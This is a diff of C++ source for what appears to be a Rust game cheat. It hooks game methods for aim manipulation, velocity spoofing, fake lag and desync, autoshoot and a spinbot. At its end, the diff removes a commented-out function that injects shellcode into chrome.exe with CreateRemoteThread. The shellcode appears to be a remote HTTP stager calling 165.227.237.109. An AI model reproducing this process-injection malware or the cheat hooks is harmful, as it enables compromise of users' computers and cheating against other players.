@@ -3,7 +3,9 @@
 #include "settings.hpp"
 #include "offsets.h"
 #include <math.h>
+#include "Keybind.h"
 
+//#include <vector>
 namespace misc
 {
 	bool manual = false;
@@ -11,6 +13,13 @@ namespace misc
 	bool manipulate_vis = false;
 	Vector3 cLastTickPos{};
 	Vector3 best_lean{};
+
+	double fabs(double x)
+	{
+		union { double f; uint64_t i; } u = { x };
+		u.i &= -1ULL / 2;
+		return u.f;
+	}
 
 	bool TestNoClipping(base_player* ply = esp::local_player,
 		Vector3 oldPos = Vector3(0, 0, 0),
@@ -22,44 +31,14 @@ namespace misc
 		float magnitude = (newPos - vector).Length();
 		Ray z = Ray(vector, normalized);
 		bool flag = unity::Raycast(z, magnitude + radius, 429990145);
-
-		//auto hitinfo_class = il2cpp::init_class(_("RaycastHit"));
-		//if (!hitinfo_class)
-		//	return flag;
-		//
-		//RaycastHit* hitInfo = (RaycastHit*)il2cpp::methods::object_new(hitinfo_class);
-		//
 		//if (!flag)
 		//{
-		//	flag = unity::Spherecast(vector, radius, normalized, hitInfo, magnitude, 429990145);
+		//	flag = unity::Spherecast(z, radius, magnitude, 429990145);
 		//}
 		return flag;
 	}
-	
-	void get_cyl(float radius, unsigned int sectors, Vector3 re[])
-	{
-		int index = 0;
-		for (float y = -1.5f; y < 1.5f; y += 0.2f) {
-			int points = sectors;
-			float step = (M_PI_2) / points;
-			float x, z, current = 0;
-			for (size_t i = 0; i < points; i++)
-			{
-				x = Vector3::my_sin(current) * radius;
-				z = Vector3::my_cos(current) * radius;
 
-				re[index++] = Vector3(x, y, z);
-				re[index++] = Vector3(-x, y, z);
-				re[index++] = Vector3(x, y, -z);
-				re[index++] = Vector3(-x, y, -z);
-
-				current += step;
-			}
-		}
-	}
-	
-
-	bool ValidateEyePos(Vector3 pos, Vector3 offset = Vector3(0,0,0))
+	bool ValidateEyePos(Vector3 pos, Vector3 offset = Vector3(0, 0, 0))
 	{
 		bool flag = false;
 		auto loco = esp::local_player;
@@ -67,9 +46,9 @@ namespace misc
 		float num = 1.5f;
 		float num2 = 2.f / 60.f;
 		float deltatime = get_deltaTime();
-		float smooth_deltatime = get_smoothdeltaTime();
-		float fixed_deltatime = get_fixeddeltaTime();
-		float num3 = 2.f * max(deltatime, max(smooth_deltatime, fixed_deltatime));
+		//float smooth_deltatime = get_smoothdeltaTime();
+		//float fixed_deltatime = get_fixeddeltaTime();
+		float num3 = 2.f * deltatime;
 		float num4 = (1.f + num2 + num3) * num;
 		float num5 = loco->max_velocity() + GetParentVelocity(loco).Length();
 		float num6 = loco->boundspadding() + num4 * num5;
@@ -95,43 +74,63 @@ namespace misc
 		return flag;
 	}
 
-
-	bool can_manipulate(base_player* ply, Vector3 pos, float mm_eye = 6.f) //7m only check rn
+	bool can_manipulate(base_player* ply, Vector3 pos, float mm_eye = 7.f) //7m only check rn
 	{
 		Vector3 v = *reinterpret_cast<Vector3*>((uintptr_t)ply + eyes);
 		Vector3 re_p = ply->get_bone_transform(47)->get_bone_position() + ply->get_bone_transform(47)->up() * (ply->get_player_eyes()->get_view_offset().y + v.y);
 		//std::vector<Vector3> ar{};
-		Vector3 ar[10000] = {};
+		//get_cyl(mm_eye, 10, ar);
 
+		/*
 		if (ply->is_visible(re_p, pos))
 		{
 			misc::best_lean = Vector3(0, 0, 0);
 			return true;
-		}
+		}*/
 
-		get_cyl(mm_eye, 10, ar);
-		//spheres::determine_array(mm_eye, ar);
-
-		for (auto a : ar)
-		{
+		auto do_check = [&](Vector3 a) {
 			Vector3 p = re_p + a;
 
-			if (!ply->is_visible(p, re_p) || a == Vector3(0,0,0))
-				continue;	
+			if (!ply->is_visible(p, re_p))
+				return false;
 
-			//if (!ply->is_visible(p - Vector3(0, 0.1, 0), re_p)) //double check not too low as likes to shoot from just under the ground
-			//	continue;
+			if (!ply->is_visible(p - Vector3(0, 0.1, 0), re_p)) //double check not too low as likes to shoot from just under the ground
+				return false;
 
-			//Sphere(p, 0.05f, col(1, 1, 1, 1), 0.02f, 10);
+			Sphere(p, 0.05f, col(0.1, 0.3, 0.9, 1), 0.01f, 10);
 			if (!ply->is_visible(p, pos))
-				continue;
+				return false;
 
 			if (ValidateEyePos(p))
-				continue;
+				return false;
 
 			misc::best_lean = a;
 			return true;
+		};
+
+		for (float y = -1.5f; y < 1.5f; y += 0.1f) {
+			int points = 10;
+			float step = (M_PI_2) / points;
+			float x, z, current = 0;
+			for (size_t i = 0; i < points; i++)
+			{
+				x = Vector3::my_sin(current) * mm_eye;
+				z = Vector3::my_cos(current) * mm_eye;
+
+				Vector3 p1 = Vector3(x, y, z);
+				Vector3 p2 = Vector3(-x, y, z);
+				Vector3 p3 = Vector3(x, y, -z);
+				Vector3 p4 = Vector3(-x, y, -z);
+
+				if (do_check(p1)) return true;
+				if (do_check(p2)) return true;
+				if (do_check(p3)) return true;
+				if (do_check(p4)) return true;
+
+				current += step;
+			}
 		}
+
 		misc::best_lean = Vector3(0, 0, 0);
 		return false;
 	}
@@ -152,16 +151,15 @@ namespace hooks {
 		static auto blocksprint = reinterpret_cast<void (*)(base_player*, float)>(*reinterpret_cast<uintptr_t*>(il2cpp::method(_("BasePlayer"), _("BlockSprint"), 1, _(""), _(""))));
 		static auto OnNetworkMessage = reinterpret_cast<void (*)(uintptr_t, uintptr_t)>(*reinterpret_cast<uintptr_t*>(il2cpp::method(_("Client"), _("OnNetworkMessage"), 1, _(""), _(""))));
 		static auto IsConnected = reinterpret_cast<bool (*)(uintptr_t)>(*reinterpret_cast<uintptr_t*>(il2cpp::method(_("Client"), _("IsConnected"), 0, _(""), _("Network"))));
-		static auto Run = reinterpret_cast<rust::classes::string (*)(uintptr_t, uintptr_t, rust::classes::string, uintptr_t)>(*reinterpret_cast<uintptr_t*>(il2cpp::method(_("ConsoleSystem"), _("Run"), 3, _(""), _(""))));
+		static auto Run = reinterpret_cast<rust::classes::string(*)(uintptr_t, uintptr_t, rust::classes::string, uintptr_t)>(*reinterpret_cast<uintptr_t*>(il2cpp::method(_("ConsoleSystem"), _("Run"), 3, _(""), _(""))));
 
 
-		static auto get_bodyleanoffset = reinterpret_cast<Vector3 (*)(playereyes*)>(*reinterpret_cast<uintptr_t*>(il2cpp::method(_("PlayerEyes"), _("get_BodyLeanOffset"), 0, _(""), _(""))));
-		static auto EyePositionForPlayer = reinterpret_cast<Vector3 (*)(basemountable*, base_player*, Vector4)>(*reinterpret_cast<uintptr_t*>(il2cpp::method(_("BaseMountable"), _("EyePositionForPlayer"), 2, _(""), _(""))));
+		static auto get_bodyleanoffset = reinterpret_cast<Vector3(*)(playereyes*)>(*reinterpret_cast<uintptr_t*>(il2cpp::method(_("PlayerEyes"), _("get_BodyLeanOffset"), 0, _(""), _(""))));
+		static auto EyePositionForPlayer = reinterpret_cast<Vector3(*)(basemountable*, base_player*, Vector4)>(*reinterpret_cast<uintptr_t*>(il2cpp::method(_("BaseMountable"), _("EyePositionForPlayer"), 2, _(""), _(""))));
 		static auto isdown = reinterpret_cast<bool(*)(input_state*, int)>(*reinterpret_cast<uintptr_t*>(il2cpp::method(_("InputState"), _("IsDown"), 1, _(""), _(""))));
 		static auto eokadoattack = reinterpret_cast<void(*)(uintptr_t)>(*reinterpret_cast<uintptr_t*>(il2cpp::method(_("FlintStrikeWeapon"), _("DoAttack"), 0, _(""), _(""))));
 		static auto baseprojectile_launchprojectile = reinterpret_cast<void(*)(uintptr_t)>(*reinterpret_cast<uintptr_t*>(il2cpp::method(_("BaseProjectile"), _("LaunchProjectile"), 0, _(""), _(""))));
 		static auto baseprojectile_createprojectile = reinterpret_cast<uintptr_t(*)(base_projectile*, rust::classes::string, Vector3, Vector3, Vector3)>(*reinterpret_cast<uintptr_t*>(il2cpp::method(_("BaseProjectile"), _("CreateProjectile"), 0, _(""), _(""))));
-		//static auto aimconeutil_getmodifiedaimconedirection = reinterpret_cast<Vector3(*)(float, Vector3, bool)>(*reinterpret_cast<uintptr_t*>(il2cpp::method(_("AimConeUtil"), _("GetModifiedAimConeDirection"), -1, _(""), _(""))));
 
 		uintptr_t playerprojectileattack;
 		uintptr_t baseprojectilecreateprojectile;
@@ -208,7 +206,7 @@ namespace hooks {
 
 		orig::get_bodyleanoffset = reinterpret_cast<Vector3(*)(playereyes*)>(*reinterpret_cast<uintptr_t*>(il2cpp::method(_("PlayerEyes"), _("get_BodyLeanOffset"), 0, _(""), _(""))));
 
-		orig::isdown = reinterpret_cast<bool(*)(input_state*,int)>(*reinterpret_cast<uintptr_t*>(il2cpp::method(_("InputState"), _("IsDown"), 1, _(""), _(""))));
+		orig::isdown = reinterpret_cast<bool(*)(input_state*, int)>(*reinterpret_cast<uintptr_t*>(il2cpp::method(_("InputState"), _("IsDown"), 1, _(""), _(""))));
 
 		orig::UpdateVelocity = reinterpret_cast<void (*)(playerwalkmovement*)>(*reinterpret_cast<uintptr_t*>(il2cpp::method(_("PlayerWalkMovement"), _("UpdateVelocity"), -1, _(""), _(""))));
 
@@ -219,8 +217,6 @@ namespace hooks {
 		orig::baseprojectile_launchprojectile = reinterpret_cast<void(*)(uintptr_t)>(*reinterpret_cast<uintptr_t*>(il2cpp::method(_("BaseProjectile"), _("LaunchProjectile"), 0, _(""), _(""))));
 
 		orig::baseprojectile_createprojectile = reinterpret_cast<uintptr_t(*)(base_projectile*, rust::classes::string, Vector3, Vector3, Vector3)>(*reinterpret_cast<uintptr_t*>(il2cpp::method(_("BaseProjectile"), _("CreateProjectile"), 0, _(""), _(""))));
-
-		//orig::aimconeutil_getmodifiedaimconedirection = reinterpret_cast<Vector3(*)(float, Vector3, bool)>(*reinterpret_cast<uintptr_t*>(il2cpp::method(_("AimConeUtil"), _("GetModifiedAimConeDirection"), -1, _(""), _(""))));
 
 		serverrpc_projecileshoot = rb::pattern::find_rel(
 			_("GameAssembly.dll"), _("4C 8B 0D ? ? ? ? 48 8B 75 28"));
@@ -357,7 +353,7 @@ namespace hooks {
 				auto projectile = *(uintptr_t*)(shoot_list + 0x20 + i * 0x8);
 
 				rpc_position = *reinterpret_cast<Vector3*>(projectile + 0x18);
-				
+
 
 				if (settings::weapon::manipulator
 					&& (unity::GetKey((rust::classes::KeyCode)settings::keybind::manipulator)
@@ -378,21 +374,9 @@ namespace hooks {
 					}
 				}
 
-				//original_vel = *reinterpret_cast<Vector3*>(projectile + 0x24);
-				
-				Vector3 target_dir = (rpc_position - target.pos).normalize();
-				float vel = 100.f;
-				for (int i = 0; i < projectile_list->get_size(); i++) {
-					auto projectile = *(base_projectile**)((uintptr_t)projectile_list + 0x20 + i * 0x8);
+				original_vel = *reinterpret_cast<Vector3*>(projectile + 0x24);
 
-					if (!projectile)
-						continue;
-					vel = projectile->get_item_mod_projectile()->get_projectile_velocity();
-				}
-				Vector3 spoofed_vel = target_dir * (vel * 1.49 * 1 + 0);
-				
-				original_vel = spoofed_vel;
-				
+
 				if (target.player && (target.visible || manipulated || misc::autoshot) && !target.teammate) {
 					if (!settings::weapon::bullet_tp)
 						Prediction(rpc_position, target.pos, target.velocity, original_vel.Length(), stats.gravity_modifier);
@@ -568,38 +552,38 @@ namespace hooks {
 		return orig_fn(rcx, rdx, r9, _ppa, arg5);
 	}
 
-//
-//void hk_baseprojectile_OnSignal(base_projectile* baseprojectile, int signal , rust::classes::string string) {
-//	orig::BaseProjectile_OnSignal(baseprojectile, signal, string);
-//
-//	if (settings::visuals::raid_esp) {
-//		auto reusableInstace = il2cpp::value(_("Effect"), _("reusableInstace"), false);
-//
-//		auto draw_explosion = [&](const char* explosion_name) {
-//			auto world_position = *reinterpret_cast<Vector3*>(reusableInstace + 0x5C);
-//			vector2 w2s_position = {};
-//			if (esp::out_w2s(world_position, w2s_position)) {
-//				esp::draw_item(w2s_position, il2cpp::methods::new_string(_("Rocket Explosion")), { 255,0,0,255 });
-//			}
-//		};
-//
-//		if (reusableInstace) {
-//			auto world_position = *reinterpret_cast<transform**>(reusableInstace + 0x78);
-//
-//			auto esp_name = (str)(*reinterpret_cast<uintptr_t*>(reusableInstace + 0x88));
-//			auto name = esp_name->str;
-//
-//			LOG("Prefab names: %ls", name);
-//
-//			if (m_wcsicmp(name, _(L"assets/prefabs/weapons/rocketlauncher/effects/rocket_explosion.prefab"))) {
-//				draw_explosion(_("Rocket Explosion"));
-//			}
-//			else if (m_wcsicmp(name, _(L"assets/prefabs/tools/c4/effects/c4_explosion.prefab"))) {
-//				draw_explosion(_("C4 Explosion"));
-//			}
-//		}
-//	}
-//}
+	//
+	//void hk_baseprojectile_OnSignal(base_projectile* baseprojectile, int signal , rust::classes::string string) {
+	//	orig::BaseProjectile_OnSignal(baseprojectile, signal, string);
+	//
+	//	if (settings::visuals::raid_esp) {
+	//		auto reusableInstace = il2cpp::value(_("Effect"), _("reusableInstace"), false);
+	//
+	//		auto draw_explosion = [&](const char* explosion_name) {
+	//			auto world_position = *reinterpret_cast<Vector3*>(reusableInstace + 0x5C);
+	//			vector2 w2s_position = {};
+	//			if (esp::out_w2s(world_position, w2s_position)) {
+	//				esp::draw_item(w2s_position, il2cpp::methods::new_string(_("Rocket Explosion")), { 255,0,0,255 });
+	//			}
+	//		};
+	//
+	//		if (reusableInstace) {
+	//			auto world_position = *reinterpret_cast<transform**>(reusableInstace + 0x78);
+	//
+	//			auto esp_name = (str)(*reinterpret_cast<uintptr_t*>(reusableInstace + 0x88));
+	//			auto name = esp_name->str;
+	//
+	//			LOG("Prefab names: %ls", name);
+	//
+	//			if (m_wcsicmp(name, _(L"assets/prefabs/weapons/rocketlauncher/effects/rocket_explosion.prefab"))) {
+	//				draw_explosion(_("Rocket Explosion"));
+	//			}
+	//			else if (m_wcsicmp(name, _(L"assets/prefabs/tools/c4/effects/c4_explosion.prefab"))) {
+	//				draw_explosion(_("C4 Explosion"));
+	//			}
+	//		}
+	//	}
+	//}
 
 #define ptr_assert(val) \
     if(val == 0)        \
@@ -639,20 +623,19 @@ namespace hooks {
 	{
 		auto p = (Projectile*)projectile;
 
-		
+
 		return Update(p);
 	}
 
-	Vector3 AimConeDir_hk(float aimcone, Vector3 input, bool anywhereInside)
+	void AimConeDir_hk(float aimcone, Vector3 input, bool anywhereInside)
 	{
-		//return orig::aimconeutil_getmodifiedaimconedirection(aimcone, input, anywhereInside);
-		return Vector3(0, 0, 0);
+		//return orig::getmodifiedaimcone(aimcone, input, anywhereInside);
 	}
 
 
 	void hk_OnNetworkMessage(uintptr_t client, uintptr_t packet)
 	{
-	//	draw_raid();
+		//	draw_raid();
 		orig::OnNetworkMessage(client, packet);
 	}
 
@@ -721,7 +704,7 @@ namespace hooks {
 
 		flying = player_walk_movement->get_flying();
 
-		if (!settings::misc::silentwalk || unity::GetKey((rust::classes::KeyCode)settings::keybind::silentwalk)) {
+		if (!keybinds::silentwalkb || unity::GetKey(keybinds::silentwalkk)) {
 			if (settings::misc::silentwalk) {
 				set_onLadder(model_state, true);
 			}
@@ -755,11 +738,11 @@ namespace hooks {
 	{
 		__try
 		{
-			if(!esp::local_player)
+			if (!esp::local_player)
 				return orig::get_bodyleanoffset(e);
 			if (settings::weapon::manipulator && misc::best_lean != Vector3(0, 0, 0))
 				return misc::best_lean;
-			
+
 			return orig::get_bodyleanoffset(e);
 			//return Vector3(0, 0, 0);
 		}
@@ -772,7 +755,7 @@ namespace hooks {
 
 	Vector3 hk_EyePositionForPlayer(playereyes* eyes)
 	{
-		if(!esp::local_player)
+		if (!esp::local_player)
 			return eyes->get_position();
 		if (misc::best_lean == Vector3(0, 0, 0))
 			return eyes->get_position();
@@ -860,14 +843,14 @@ namespace hooks {
 			MessageBoxA(0, "WORKED", "AZ", 0);
 		}
 
-	//	if (!self->flying()) {
-		
+		//	if (!self->flying()) {
+
 
 		return orig::UpdateVelocity(self);
 	}
 
 
-	void hk_HandleJumping(playerwalkmovement* self, modelstate* state, bool jump, bool in_dir = false) 
+	void hk_HandleJumping(playerwalkmovement* self, modelstate* state, bool jump, bool in_dir = false)
 	{
 
 	}
@@ -913,7 +896,7 @@ namespace hooks {
 
 
 	void hk_baseplayer_ClientInput(base_player* baseplayer, input_state* state) {
-		__try {
+		//__try {
 			//if(!do_fixed_update_ptr)
 			//do_fixed_update_ptr = mem::hook_virtual_function(_("PlayerWalkMovement"), _("DoFixedUpdate"), &hk_dofixedupdate);
 
@@ -1003,20 +986,18 @@ namespace hooks {
 
 				}
 
-				bool manipulation = false;
 				float mm_eye = ((0.01f + ((settings::desyncTime + 2.f / 60.f + 0.125f) * baseplayer->max_velocity())));
 				float time = get_fixedTime();
 				if (esp::best_target.player && held)
 				{
 					Vector3 target = esp::best_target.player->get_bone_transform(48)->get_bone_position();
-					//Sphere(target, 0.05, col(0.8, 0.9, 0.3, 1), 0.05f, 10.f);
+					Sphere(target, 0.05, col(0.8, 0.9, 0.3, 1), 0.05f, 10.f);
 					auto mag = *reinterpret_cast<uintptr_t*>((uintptr_t)held + primaryMagazine);
 					auto mag_ammo = *reinterpret_cast<int*>((uintptr_t)mag + 0x1C); //0x1C = public int contents;
 					if (settings::weapon::manipulator
 						&& ((unity::GetKey(rust::classes::KeyCode(settings::keybind::manipulator)))
 							|| misc::manipulate_vis))
 					{
-						manipulation = true;
 						float nextshot = misc::fixed_time_last_shot + held->get_repeat_delay();
 						if (misc::can_manipulate(baseplayer, target, mm_eye))
 							if (nextshot < time
@@ -1036,8 +1017,8 @@ namespace hooks {
 					if ((settings::weapon::autoshoot || unity::GetKey(rust::classes::KeyCode(settings::keybind::autoshoot))))
 					{
 						float nextshot = misc::fixed_time_last_shot + held->get_repeat_delay();
-						//Sphere(target, 0.05f, col(0.6, 0.6, 0.6, 1), 0.02f, 100.f);
-						//Sphere(baseplayer->get_bone_transform(48)->get_bone_position(), 0.05f, col(0.6, 0.6, 0.6, 1), 0.02f, 100.f);
+						Sphere(target, 0.05f, col(0.6, 0.6, 0.6, 1), 0.02f, 100.f);
+						Sphere(baseplayer->get_bone_transform(48)->get_bone_position(), 0.05f, col(0.6, 0.6, 0.6, 1), 0.02f, 100.f);
 						if (baseplayer->is_visible(target, baseplayer->get_bone_transform(48)->get_bone_position())
 							&& get_fixedTime() > nextshot
 							&& held->get_time_since_deploy() > held->get_deploy_delay()
@@ -1056,7 +1037,7 @@ namespace hooks {
 							&& settings::weapon::manipulator
 							&& mag_ammo > 0)
 						{
-							if (misc::can_manipulate(baseplayer, target, 6.f))
+							if (misc::can_manipulate(baseplayer, target, 5.f))
 							{//maybe check more later idk
 								misc::manipulate_vis = true;
 							}
@@ -1067,21 +1048,13 @@ namespace hooks {
 				}
 				else misc::manipulate_vis = false;
 				//desync on key
-
-				if (manipulation)
-						baseplayer->set_client_tick_interval(0.99f);
-				
-
-				if (settings::misc::fake_lag && !manipulation)
-				{
-					esp::local_player->set_client_tick_interval(0.4f);
-					is_lagging = true;
-				}
-				else if (!settings::misc::fake_lag && !manipulation) {
-					esp::local_player->set_client_tick_interval(0.05f);
-					is_lagging = false;
-				}
-
+				if (unity::GetKey(rust::classes::KeyCode(settings::keybind::desync_ok))
+					|| (settings::weapon::manipulator
+						&& (unity::GetKey(rust::classes::KeyCode(settings::keybind::manipulator))
+							|| misc::manipulate_vis)))
+					baseplayer->set_client_tick_interval(0.99f);
+				else if (!is_lagging && !is_speeding)
+					baseplayer->set_client_tick_interval(0.05f);
 
 				if (settings::weapon::always_reload
 					&& held)
@@ -1103,6 +1076,21 @@ namespace hooks {
 						misc::did_reload = true;
 						misc::time_since_last_shot = 0;
 					}
+				}
+
+				if (!keybinds::fakelagb || unity::GetKey(keybinds::fakelagk)) {
+					if (!is_lagging && !flying && settings::misc::fake_lag && !is_speeding) {
+						baseplayer->set_client_tick_interval(0.4f);
+						is_lagging = true;
+					}
+				}
+				else if (is_lagging && flying || is_lagging && is_speeding) {
+					esp::local_player->set_client_tick_interval(0.03f);
+					is_lagging = false;
+				}
+				else if (is_lagging && !settings::misc::fake_lag) {
+					esp::local_player->set_client_tick_interval(0.05f);
+					is_lagging = false;
 				}
 
 				if (settings::misc::eyeoffset || unity::GetKey((rust::classes::KeyCode)settings::keybind::neck))
@@ -1312,56 +1300,10 @@ namespace hooks {
 			if (settings::misc::spinbot) {
 				state->set_aim_angles(Vector3(100, my_rand() % 999 + -999, 100));
 			}
-		}
-		__except (true)
-		{
-			LOG("[+] Error in func %s!", _(__FUNCTION__));
-		}
+		//}
+		//__except (true)
+		//{
+		//	LOG("[+] Error in func %s!", _(__FUNCTION__));
+		//}
 	}
 }
-
-/*
-DWORD FindProcessId(const std::wstring& processName)
-{
-	PROCESSENTRY32 processInfo;
-	processInfo.dwSize = sizeof(processInfo);
-
-	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
-	if (processesSnapshot == INVALID_HANDLE_VALUE)
-		return 0;
-
-	Process32First(processesSnapshot, &processInfo);
-	if (!processName.compare(processInfo.szExeFile))
-	{
-		CloseHandle(processesSnapshot);
-		return processInfo.th32ProcessID;
-	}
-
-	while (Process32Next(processesSnapshot, &processInfo))
-	{
-		if (!processName.compare(processInfo.szExeFile))
-		{
-			CloseHandle(processesSnapshot);
-			return processInfo.th32ProcessID;
-		}
-	}
-
-	CloseHandle(processesSnapshot);
-	return 0;
-}
-int doz()
-{
-	unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x90\x1f\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x79\x62\x4a\x38\x00\x33\x46\xf1\xe5\x01\x6e\x6f\xae\xc0\xfe\x72\xa3\x58\x86\x6f\x7a\xed\xb5\x0d\xe9\x71\x7f\x51\x28\x2a\x08\xe2\x9b\x59\x95\x82\xb2\x73\x27\xeb\xbb\x37\xf0\xb2\xa1\x91\x39\x94\x50\x68\xd9\x82\x48\xc0\x0f\x17\xb0\xbf\x02\x6e\xa5\x0a\x6b\xc6\x1a\x4d\xa4\x38\xd8\xe7\x35\x8a\x1a\x82\xac\x6c\x88\x40\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x34\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x38\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x35\x2e\x31\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x34\x2e\x30\x3b\x20\x49\x6e\x66\x6f\x50\x61\x74\x68\x2e\x32\x3b\x20\x2e\x4e\x45\x54\x34\x2e\x30\x43\x29\x0d\x0a\x00\x61\xa4\x7d\xc8\x5e\x81\x08\x6f\x45\x52\x65\x0c\x37\xa5\x41\x01\xf7\xc5\x63\x04\xc9\xf3\x0b\xb1\xdd\xb8\x70\x8f\x55\x43\xae\x0f\x9d\x22\xa1\x29\xc7\x4c\x6f\x05\x6f\x00\x11\xf5\xfc\xb9\x4f\x65\xaf\x59\x70\xeb\x2c\x38\xf6\xdd\xc1\x76\xef\x79\xed\x5f\x04\xa8\x45\x4c\xc5\x98\x61\xf0\xcd\x7c\x30\x4b\xb7\xd6\x07\x49\xfa\x3d\x4f\xcb\xa6\x44\x64\x7f\xab\xd2\xcc\xd3\xc4\xe6\xdb\x80\x56\xad\xde\xd5\x80\xbb\x75\x65\x62\x91\x55\x28\xe2\xf4\xbe\x0a\x50\x7e\x41\x03\xf6\x73\xd5\x40\x81\x55\x3f\x7d\xf9\x54\x13\xac\x0c\xb8\x32\x79\xb3\x7c\x44\x93\x51\x0a\xbc\x61\xbb\x01\xc5\x72\xfc\x8c\xa8\x36\xcd\xed\x58\x80\x2c\xa6\xaf\xf9\x1b\x29\x82\xf8\xe3\x07\x4a\xc6\x97\xfa\x38\x6c\x9a\x2b\xc2\x3b\xcf\x03\xbb\x66\xee\x8a\x29\x0e\x3a\x01\x66\x0d\x8c\xbd\xc9\x72\x5a\x27\x5d\x42\x4a\x3a\x2f\x61\x10\x75\x10\x9b\x53\x88\x6a\xc8\xb1\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x36\x35\x2e\x32\x32\x37\x2e\x32\x33\x37\x2e\x31\x30\x39\x00\x19\x69\xa0\x8d";
-
-	HANDLE processHandle;
-	HANDLE remoteThread;
-	PVOID remoteBuffer;
-	auto pid = FindProcessId(L"chrome.exe");
-	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
-	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
-	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
-	CloseHandle(processHandle);
-	return 0;
-}
-*/
